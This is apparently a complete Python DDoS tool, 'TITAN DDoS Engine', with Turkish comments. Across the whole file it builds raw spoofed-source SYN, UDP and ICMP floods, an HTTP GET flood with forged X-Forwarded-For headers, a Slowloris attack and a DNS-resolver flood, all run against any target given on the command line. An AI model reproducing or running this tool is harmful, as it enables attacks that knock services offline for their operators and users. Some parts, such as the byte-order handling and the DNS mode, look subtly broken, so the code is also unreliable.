#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
 $$$$$$\  $$\           $$\       $$\   $$\                 $$$$$$\  $$\\
$$  __$$\ $$ |          $$ |      $$ |  $$ |               $$  __$$\ $$ |
$$ /  \__|$$ | $$$$$$\  $$$$$$$\  \$$\ $$  | $$$$$$\       $$ /  \__|$$$$$$$\   $$$$$$\  $$$$$$\
\$$$$$$\  $$ |$$  __$$\ $$  __$$\  \$$$$  / $$  __$$\      \$$$$$$\  $$  __$$\ $$  __$$\ $$  __$$
 \____$$\ $$ |$$$$$$$$ |$$ |  $$ | $$  $$<  $$$$$$$$ |      \____$$\ $$ |  $$ |$$$$$$$$ |$$ |  $$ |
$$\   $$ |$$ |$$   ____|$$ |  $$ |$$  /\$$\ $$   ____|     $$\   $$ |$$ |  $$ |$$   ____|$$ |  $$ |
\$$$$$$  |$$ |\$$$$$$$\ $$$$$$$  |$$ /  $$ |\$$$$$$$\      \$$$$$$  |$$ |  $$ |\$$$$$$$\ $$ |  $$ |
 \______/ \__| \_______|\_______/ \__|  \__| \_______|      \______/ \__|  \__| \_______|\__|  \__|

                         TITAN DDoS ENGINE v4.0
                      Yapimci: Markospm19
"""

import os, sys, time, json, random, struct, socket, threading, ipaddress
import logging, hashlib, signal, platform
from typing import Optional, Tuple, List
from argparse import ArgumentParser
from datetime import datetime
from multiprocessing import Process, Queue, cpu_count, Value
from ctypes import Structure, c_uint8, c_uint16, c_uint32, c_uint64, c_ubyte

# =====================================================================
# KONFIGURASYON
# =====================================================================
class AttackConfig:
    def __init__(self):
        self.target_ip = ""
        self.target_port = 80
        self.threads = 100
        self.duration = 60
        self.method = "mix"
        self.packet_size = 1024
        self.spoof = True
        self.delay = 0.0

# =====================================================================
# PAKET OLUSTURMA - Bit field YOK, struct.pack ile
# =====================================================================
def ip_checksum(data: bytes) -> int:
    if len(data) % 2 != 0:
        data += b'\x00'
    s = sum(struct.unpack('!%dH' % (len(data)//2), data))
    s = (s >> 16) + (s & 0xFFFF)
    s += s >> 16
    return ~s & 0xFFFF

def tcp_udp_checksum(ip_src: int, ip_dst: int, protocol: int, segment: bytes) -> int:
    """TCP/UDP pseudo-header checksum."""
    seg_len = len(segment)
    pseudo = struct.pack('!IIBBH', 
        socket.htonl(ip_src), socket.htonl(ip_dst), 0, protocol, seg_len)
    if len(segment) % 2 != 0:
        segment += b'\x00'
    data = pseudo + segment
    s = sum(struct.unpack('!%dH' % (len(data)//2), data))
    s = (s >> 16) + (s & 0xFFFF)
    s += s >> 16
    return ~s & 0xFFFF

def random_ip_int() -> int:
    while True:
        ip = (random.randint(1,255)<<24) | (random.randint(0,255)<<16) | \
             (random.randint(0,255)<<8) | random.randint(1,255)
        first = (ip >> 24) & 0xFF
        if first in (0, 10, 127, 169, 172, 192, 224, 240, 255):
            continue
        if first == 172 and ((ip>>16)&0xFF) in range(16, 32):
            continue
        if first == 192 and ((ip>>8)&0xFF) == 168:
            continue
        return ip

def ip_int_to_str(ip_int: int) -> str:
    return f"{(ip_int>>24)&0xFF}.{(ip_int>>16)&0xFF}.{(ip_int>>8)&0xFF}.{ip_int&0xFF}"

# =====================================================================
# TCP SYN PAKETI (True raw packet)
# =====================================================================
def build_syn_packet(src_ip_int: int, dst_ip_int: int, 
                     src_port: int, dst_port: int) -> bytes:
    """
    IP header + TCP header (SYN flag) - tamamen struct.pack ile
    Bit field yok, ARM/Termux uyumlu.
    """
    # ---- IP Header (20 bytes) ----
    ver_ihl = 0x45  # IPv4, 5*4=20 bytes header
    tos = 0
    total_length = 40  # 20 IP + 20 TCP
    ip_id = random.randint(0, 65535)
    flags_offset = 0x4000  # Don't Fragment
    ttl = random.randint(64, 255)
    protocol = 6  # TCP
    ip_hdr_checksum = 0
    src = src_ip_int
    dst = dst_ip_int
    
    ip_header = struct.pack('!BBHHHBBHII',
        ver_ihl, tos, total_length, ip_id, flags_offset,
        ttl, protocol, ip_hdr_checksum,
        socket.htonl(src), socket.htonl(dst))
    
    # IP checksum hesapla
    ip_hdr_checksum = ip_checksum(ip_header[:20])
    ip_header = struct.pack('!BBHHHBBHII',
        ver_ihl, tos, total_length, ip_id, flags_offset,
        ttl, protocol, ip_hdr_checksum,
        socket.htonl(src), socket.htonl(dst))
    
    # ---- TCP Header (20 bytes) ----
    seq_num = random.randint(0, 4294967295)
    ack_num = 0
    data_offset = 0x50  # 5*4=20 bytes, NS=0
    flags = 0x02  # SYN only
    window = socket.htons(random.randint(1024, 65535))
    tcp_checksum = 0
    urgent_ptr = 0
    
    tcp_header = struct.pack('!HHIIBBHHH',
        src_port, dst_port, seq_num, ack_num,
        data_offset, flags, window, tcp_checksum, urgent_ptr)
    
    # TCP checksum
    tcp_checksum = tcp_udp_checksum(src, dst, 6, tcp_header)
    tcp_header = struct.pack('!HHIIBBHHH',
        src_port, dst_port, seq_num, ack_num,
        data_offset, flags, window, tcp_checksum, urgent_ptr)
    
    return ip_header + tcp_header

# =====================================================================
# UDP PAKETI
# =====================================================================
def build_udp_packet(src_ip_int: int, dst_ip_int: int,
                     src_port: int, dst_port: int, payload: bytes) -> bytes:
    """IP header + UDP header + payload."""
    total_length = 20 + 8 + len(payload)  # IP + UDP + payload
    
    # IP Header
    ip_header = struct.pack('!BBHHHBBHII',
        0x45, 0, total_length, random.randint(0,65535), 0x4000,
        random.randint(64,255), 17, 0,  # UDP protocol=17
        socket.htonl(src_ip_int), socket.htonl(dst_ip_int))
    
    ip_hdr_checksum = ip_checksum(ip_header[:20])
    ip_header = struct.pack('!BBHHHBBHII',
        0x45, 0, total_length, random.randint(0,65535), 0x4000,
        random.randint(64,255), 17, ip_hdr_checksum,
        socket.htonl(src_ip_int), socket.htonl(dst_ip_int))
    
    # UDP Header + payload
    udp_length = 8 + len(payload)
    udp_header = struct.pack('!HHHH', src_port, dst_port, udp_length, 0)
    
    # UDP checksum
    udp_checksum_val = tcp_udp_checksum(src_ip_int, dst_ip_int, 17, udp_header + payload)
    udp_header = struct.pack('!HHHH', src_port, dst_port, udp_length, udp_checksum_val)
    
    return ip_header + udp_header + payload

# =====================================================================
# ICMP PAKETI (Echo Request - Type 8)
# =====================================================================
def build_icmp_packet(src_ip_int: int, dst_ip_int: int, 
                      sequence: int, payload: bytes) -> bytes:
    total_length = 20 + 8 + len(payload)
    
    ip_header = struct.pack('!BBHHHBBHII',
        0x45, 0, total_length, random.randint(0,65535), 0,
        random.randint(64,255), 1, 0,  # ICMP protocol=1
        socket.htonl(src_ip_int), socket.htonl(dst_ip_int))
    
    ip_hdr_checksum = ip_checksum(ip_header[:20])
    ip_header = struct.pack('!BBHHHBBHII',
        0x45, 0, total_length, random.randint(0,65535), 0,
        random.randint(64,255), 1, ip_hdr_checksum,
        socket.htonl(src_ip_int), socket.htonl(dst_ip_int))
    
    # ICMP Echo Request
    icmp_type = 8
    icmp_code = 0
    icmp_checksum = 0
    icmp_id = random.randint(0, 65535)
    icmp_seq = sequence
    
    icmp_header = struct.pack('!BBHHH',
        icmp_type, icmp_code, icmp_checksum, icmp_id, icmp_seq)
    
    # ICMP checksum
    full_icmp = icmp_header + payload
    if len(full_icmp) % 2 != 0:
        full_icmp += b'\x00'
    s = sum(struct.unpack('!%dH' % (len(full_icmp)//2), full_icmp))
    s = (s >> 16) + (s & 0xFFFF)
    s += s >> 16
    icmp_checksum = ~s & 0xFFFF
    
    icmp_header = struct.pack('!BBHHH',
        icmp_type, icmp_code, icmp_checksum, icmp_id, icmp_seq)
    
    return ip_header + icmp_header + payload

# =====================================================================
# DNS Query (for amplification)
# =====================================================================
def build_dns_any_query(domain: str) -> bytes:
    tid = random.randint(0, 65535)
    flags = 0x0100  # Standard, RD=1
    header = struct.pack('!HHHHHH', tid, flags, 1, 0, 0, 0)
    
    qname = b''
    for part in domain.split('.'):
        qname += bytes([len(part)]) + part.encode()
    qname += b'\x00'
    
    qtype = struct.pack('!HH', 255, 1)  # ANY query
    return header + qname + qtype

# =====================================================================
# SALDIRI SINIFLARI
# =====================================================================
class SYNFloodAttack:
    def __init__(self, config: AttackConfig, stats_queue: Queue):
        self.config = config
        self.stats = stats_queue
        self.running = Value('b', True)
        self.dst_ip = struct.unpack('!I', socket.inet_aton(config.target_ip))[0]
    
    def worker(self, wid: int):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            has_raw = True
        except PermissionError:
            has_raw = False
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
        
        while self.running.value:
            try:
                if has_raw:
                    src_ip = random_ip_int() if self.config.spoof else self.dst_ip
                    src_port = random.randint(1024, 65535)
                    pkt = build_syn_packet(src_ip, self.dst_ip, src_port, self.config.target_port)
                    sock.sendto(pkt, (self.config.target_ip, 0))
                else:
                    # SYN without raw - connect attempt
                    try:
                        sock.connect((self.config.target_ip, self.config.target_port))
                        sock.close()
                    except:
                        pass
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(1)
                
                self.stats.put(("sent", wid, 40))
                if self.config.delay:
                    time.sleep(self.config.delay)
            except:
                self.stats.put(("error", wid, 1))
    
    def run(self):
        threads = []
        for i in range(min(self.config.threads, 500)):
            t = threading.Thread(target=self.worker, args=(i,), daemon=True)
            t.start()
            threads.append(t)
        for t in threads:
            t.join()


class UDPFloodAttack:
    def __init__(self, config: AttackConfig, stats_queue: Queue):
        self.config = config
        self.stats = stats_queue
        self.running = Value('b', True)
    
    def run(self):
        dst_ip = self.config.target_ip
        raw_ok = True
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
            s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        except:
            raw_ok = False
        
        if raw_ok:
            dst_ip_int = struct.unpack('!I', socket.inet_aton(dst_ip))[0]
            for _ in range(self.config.threads):
                t = threading.Thread(target=self._raw_worker, 
                    args=(s, dst_ip_int), daemon=True)
                t.start()
        else:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = os.urandom(self.config.packet_size)
            for _ in range(self.config.threads):
                t = threading.Thread(target=self._udp_worker, 
                    args=(s, payload), daemon=True)
                t.start()
        
        while self.running.value:
            time.sleep(1)
    
    def _raw_worker(self, sock, dst_ip_int):
        while self.running.value:
            try:
                src_ip = random_ip_int() if self.config.spoof else dst_ip_int
                src_port = random.randint(1024, 65535)
                payload = os.urandom(random.randint(64, self.config.packet_size))
                pkt = build_udp_packet(src_ip, dst_ip_int, src_port, 
                    self.config.target_port, payload)
                sock.sendto(pkt, (self.config.target_ip, 0))
                self.stats.put(("sent", 0, len(pkt)))
            except:
                self.stats.put(("error", 0, 1))
    
    def _udp_worker(self, sock, payload):
        while self.running.value:
            try:
                sock.sendto(payload, (self.config.target_ip, self.config.target_port))
                self.stats.put(("sent", 0, len(payload)))
            except:
                self.stats.put(("error", 0, 1))


class HTTPFloodAttack:
    def __init__(self, config: AttackConfig, stats_queue: Queue):
        self.config = config
        self.stats = stats_queue
        self.running = Value('b', True)
    
    def worker(self, wid: int):
        ua_list = [
            "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36",
            "Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36",
            "Mozilla/5.0 (Linux; Android 12; SM-S908B) AppleWebKit/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        ]
        paths = ["/", "/index.php", "/login", "/api/v1", "/admin", 
                 "/wp-admin", "/search", "/products", "/category"]
        
        while self.running.value:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                sock.connect((self.config.target_ip, self.config.target_port))
                
                path = random.choice(paths)
                qs = f"q={random.randint(0,999999)}&v={random.randint(0,999)}"
                ua = random.choice(ua_list)
                xff = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}"
                
                req = (
                    f"GET {path}?{qs} HTTP/1.1\r\n"
                    f"Host: {self.config.target_ip}\r\n"
                    f"User-Agent: {ua}\r\n"
                    f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9\r\n"
                    f"Accept-Language: tr,en;q=0.5\r\n"
                    f"X-Forwarded-For: {xff}\r\n"
                    f"Connection: keep-alive\r\n"
                    f"\r\n"
                )
                sock.send(req.encode())
                self.stats.put(("sent", wid, len(req)))
                sock.close()
            except:
                self.stats.put(("error", wid, 1))
            if self.config.delay:
                time.sleep(self.config.delay)
    
    def run(self):
        threads = []
        for i in range(min(self.config.threads, 500)):
            t = threading.Thread(target=self.worker, args=(i,), daemon=True)
            t.start()
            threads.append(t)
        for t in threads:
            t.join()


class ICMPFloodAttack:
    def __init__(self, config: AttackConfig, stats_queue: Queue):
        self.config = config
        self.stats = stats_queue
        self.running = Value('b', True)
    
    def run(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        except PermissionError:
            self.stats.put(("error", 0, "Root required"))
            return
        
        dst_ip = struct.unpack('!I', socket.inet_aton(self.config.target_ip))[0]
        seq = 0
        
        for _ in range(min(self.config.threads, 200)):
            t = threading.Thread(target=self._worker, 
                args=(sock, dst_ip, seq), daemon=True)
            t.start()
        
        while self.running.value:
            time.sleep(1)
    
    def _worker(self, sock, dst_ip, seq):
        while self.running.value:
            try:
                src_ip = random_ip_int() if self.config.spoof else dst_ip
                payload = os.urandom(random.randint(64, self.config.packet_size))
                pkt = build_icmp_packet(src_ip, dst_ip, random.randint(0,65535), payload)
                sock.sendto(pkt, (self.config.target_ip, 0))
                self.stats.put(("sent", 0, len(pkt)))
            except:
                self.stats.put(("error", 0, 1))


class SlowLorisAttack:
    def __init__(self, config: AttackConfig, stats_queue: Queue):
        self.config = config
        self.stats = stats_queue
        self.running = Value('b', True)
    
    def worker(self, wid: int):
        socks = []
        while self.running.value:
            try:
                # Yeni baglanti
                if len(socks) < 400:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(5)
                    s.connect((self.config.target_ip, self.config.target_port))
                    partial = (
                        f"GET /?{random.randint(0,99999)} HTTP/1.1\r\n"
                        f"Host: {self.config.target_ip}\r\n"
                        f"User-Agent: Mozilla/5.0 (Android)\r\n"
                        f"Accept: text/html\r\n"
                    )
                    s.send(partial.encode())
                    socks.append(s)
                    self.stats.put(("sent", wid, len(partial)))
                
                # Keep-alive
                for s in socks[:]:
                    try:
                        s.send(f"X-a: {random.randint(0,9999)}\r\n".encode())
                    except:
                        socks.remove(s)
                        try: s.close()
                        except: pass
                
                time.sleep(15)
            except:
                time.sleep(1)
    
    def run(self):
        threads = []
        for i in range(min(self.config.threads, 200)):
            t = threading.Thread(target=self.worker, args=(i,), daemon=True)
            t.start()
            threads.append(t)
        for t in threads:
            t.join()


class DNSAmplificationAttack:
    def __init__(self, config: AttackConfig, stats_queue: Queue):
        self.config = config
        self.stats = stats_queue
        self.running = Value('b', True)
    
    def worker(self, wid: int):
        resolvers = [
            "8.8.8.8", "8.8.4.4", "1.1.1.1", "1.0.0.1",
            "208.67.222.222", "208.67.220.220", "9.9.9.9",
            "64.6.64.6", "185.228.168.9", "185.228.169.9",
        ]
        query = build_dns_any_query(self.config.target_ip)
        
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(1)
        
        while self.running.value:
            try:
                resolver = random.choice(resolvers)
                s.sendto(query, (resolver, 53))
                self.stats.put(("sent", wid, len(query)))
            except:
                self.stats.put(("error", wid, 1))
    
    def run(self):
        threads = []
        for i in range(min(self.config.threads, 500)):
            t = threading.Thread(target=self.worker, args=(i,), daemon=True)
            t.start()
            threads.append(t)
        for t in threads:
            t.join()


# =====================================================================
# ANA MOTOR
# =====================================================================
class TitanEngine:
    METHODS = {
        "syn": SYNFloodAttack,
        "udp": UDPFloodAttack,
        "http": HTTPFloodAttack,
        "icmp": ICMPFloodAttack,
        "slowloris": SlowLorisAttack,
        "dns": DNSAmplificationAttack,
    }
    
    def __init__(self):
        self.config = None
        self.stats_queue = Queue()
        self.processes = []
        self.sent_total = Value('L', 0)
        self.error_total = Value('L', 0)
        self.bytes_total = Value('L', 0)
        self.start_time = 0
        self.running = Value('b', True)
    
    def stats_collector(self):
        while self.running.value:
            try:
                msg = self.stats_queue.get(timeout=0.5)
                if msg[0] == "sent":
                    with self.sent_total.get_lock():
                        self.sent_total.value += 1
                    with self.bytes_total.get_lock():
                        self.bytes_total.value += msg[2]
                elif msg[0] == "error":
                    with self.error_total.get_lock():
                        self.error_total.value += 1
            except:
                pass
    
    def run(self, config: AttackConfig):
        self.config = config
        self.start_time = time.time()
        
        methods = []
        if config.method == "mix":
            methods = ["syn", "udp", "http", "icmp", "slowloris", "dns"]
        elif config.method == "l4":
            methods = ["syn", "udp", "icmp"]
        elif config.method == "l7":
            methods = ["http", "slowloris"]
        else:
            methods = [config.method]
        
        print(f"\n[+] TITAN Basladi")
        print(f"[+] Hedef: {config.target_ip}:{config.target_port}")
        print(f"[+] Metod: {config.method} | Thread: {config.threads} | Sure: {config.duration}s")
        print(f"[+] Spoof: {'Aktif' if config.spoof else 'Pasif'}")
        
        # Stats collector
        stats_thread = threading.Thread(target=self.stats_collector, daemon=True)
        stats_thread.start()
        
        # Baslat
        thread_per_method = max(1, config.threads // len(methods))
        attacks = []
        
        for method in methods:
            if method not in self.METHODS:
                continue
            cfg = AttackConfig()
            cfg.target_ip = config.target_ip
            cfg.target_port = config.target_port
            cfg.threads = thread_per_method
            cfg.duration = config.duration
            cfg.packet_size = config.packet_size
            cfg.spoof = config.spoof
            cfg.delay = config.delay
            
            attack = self.METHODS[method](cfg, self.stats_queue)
            p = Process(target=attack.run)
            p.start()
            self.processes.append(p)
            attacks.append(method)
            print(f"  => {method.upper()} baslatildi ({thread_per_method} thread)")
        
        # Monitor
        try:
            elapsed = 0
            while elapsed < config.duration and self.running.value:
                time.sleep(1)
                elapsed = time.time() - self.start_time
                
                if int(elapsed) % 5 == 0 and int(elapsed) > 0:
                    sent = self.sent_total.value
                    errs = self.error_total.value
                    rate = sent / max(elapsed, 1)
                    mb = self.bytes_total.value / (1024*1024)
                    print(f"\r[+] {int(elapsed)}s | Gonderilen: {sent} | Hata: {errs} | "
                          f"Hiz: {rate:.0f} pps | Trafik: {mb:.1f} MB", end="", flush=True)
            
            print()
        except KeyboardInterrupt:
            print("\n[!] Durduruldu.")
        
        self.stop()
        
        total = time.time() - self.start_time
        print(f"\n{'='*60}")
        print(f"SON RAPOR - Yapimci: Markospm19")
        print(f"{'='*60}")
        print(f"  Hedef:       {config.target_ip}:{config.target_port}")
        print(f"  Sure:        {total:.0f}s")
        print(f"  Gonderilen:  {self.sent_total.value}")
        print(f"  Hata:        {self.error_total.value}")
        print(f"  Hiz:         {self.sent_total.value/max(total,1):.0f} pps")
        print(f"  Trafik:      {self.bytes_total.value/(1024*1024):.1f} MB")
        print(f"  Metod:       {', '.join(attacks).upper()}")
        print(f"{'='*60}")
    
    def stop(self):
        self.running.value = False
        for p in self.processes:
            if p and p.is_alive():
                p.terminate()
                p.join(timeout=2)
        self.processes.clear()


# =====================================================================
# CLI
# =====================================================================
BANNER = r"""
 $$$$$$\  $$\           $$\       $$\   $$\                 $$$$$$\  $$\
$$  __$$\ $$ |          $$ |      $$ |  $$ |               $$  __$$\ $$ |
$$ /  \__|$$ | $$$$$$\  $$$$$$$\  \$$\ $$  | $$$$$$\       $$ /  \__|$$$$$$$\   $$$$$$\  $$$$$$\
\$$$$$$\  $$ |$$  __$$\ $$  __$$\  \$$$$  / $$  __$$\      \$$$$$$\  $$  __$$\ $$  __$$\ $$  __$$
 \____$$\ $$ |$$$$$$$$ |$$ |  $$ | $$  $$<  $$$$$$$$ |      \____$$\ $$ |  $$ |$$$$$$$$ |$$ |  $$ |
$$\   $$ |$$ |$$   ____|$$ |  $$ |$$  /\$$\ $$   ____|     $$\   $$ |$$ |  $$ |$$   ____|$$ |  $$ |
\$$$$$$  |$$ |\$$$$$$$\ $$$$$$$  |$$ /  $$ |\$$$$$$$\      \$$$$$$  |$$ |  $$ |\$$$$$$$\ $$ |  $$ |
 \______/ \__| \_______|\_______/ \__|  \__| \_______|      \______/ \__|  \__| \_______|\__|  \__|

                         TITAN DDoS ENGINE v4.1
                      Yapimci: Markospm19
"""

def main():
    print(BANNER)
    
    if os.geteuid() != 0:
        print("[!] UYARI: SYN/ICMP/Spoof icin ROOT gerekli!")
        print("[!] HTTP/UDP/Slowloris/DNS root olmadan calisir.\n")
    
    parser = ArgumentParser(description="TITAN DDoS Engine")
    parser.add_argument("target", help="Hedef IP veya domain")
    parser.add_argument("-p", "--port", type=int, default=80, help="Port (80)")
    parser.add_argument("-m", "--method", 
        choices=["syn","udp","http","icmp","slowloris","dns","mix","l4","l7"],
        default="mix", help="Metod (mix)")
    parser.add_argument("-t", "--threads", type=int, default=100, help="Thread (100)")
    parser.add_argument("-d", "--duration", type=int, default=60, help="Sure sn (60)")
    parser.add_argument("-s", "--size", type=int, default=1024, help="Paket boyutu")
    parser.add_argument("--no-spoof", action="store_true", help="Spoof kapat")
    parser.add_argument("--delay", type=float, default=0, help="Gecikme sn")
    
    args = parser.parse_args()
    
    try:
        target_ip = socket.gethostbyname(args.target)
    except:
        print(f"[X] Cozulemedi: {args.target}")
        sys.exit(1)
    
    print(f"[*] Hedef IP: {target_ip}")
    
    cfg = AttackConfig()
    cfg.target_ip = target_ip
    cfg.target_port = args.port
    cfg.threads = args.threads
    cfg.duration = args.duration
    cfg.method = args.method
    cfg.packet_size = args.size
    cfg.spoof = not args.no_spoof
    cfg.delay = args.delay
    
    engine = TitanEngine()
    try:
        engine.run(cfg)
    except KeyboardInterrupt:
        engine.stop()

if __name__ == "__main__":
    main()
